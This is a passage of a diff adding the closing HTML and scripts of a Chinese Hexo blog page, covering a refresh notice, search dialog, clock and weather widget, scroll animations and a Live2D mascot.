+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="输入关键词搜索..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '5429a99f23174127af22bfe2cc7a43df';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.6534116,27.96920845';
+  var clock_default_rectangle_enable = 'true';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="/js/ali_font.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
